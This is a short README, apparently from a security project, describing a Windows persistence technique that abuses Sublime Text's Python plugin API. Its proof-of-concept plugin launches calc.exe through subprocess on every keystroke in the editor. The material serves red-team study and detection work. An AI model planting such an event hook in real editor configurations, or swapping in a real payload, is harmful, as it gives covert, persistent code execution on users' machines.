# Sublime-persistence
Windows persistence method that abuses sublime packages.

Sublime text allows the ability to create custom plugins written in python. 
An API reference is posted below.
https://www.sublimetext.com/docs/api_reference.html

In the below python script we define a class called 'OpenCalcOnModified' which invokes the on_modified function. 
When a keystroke is detected within the sublime text editor, the .POpen() method in the subproccess module executes calc.exe.  

```import sublime
import sublime_plugin
import subprocess


class OpenCalcOnModified(sublime_plugin.EventListener):
    def on_modified(self, view):
        subprocess.Popen('calc.exe', shell=True)```






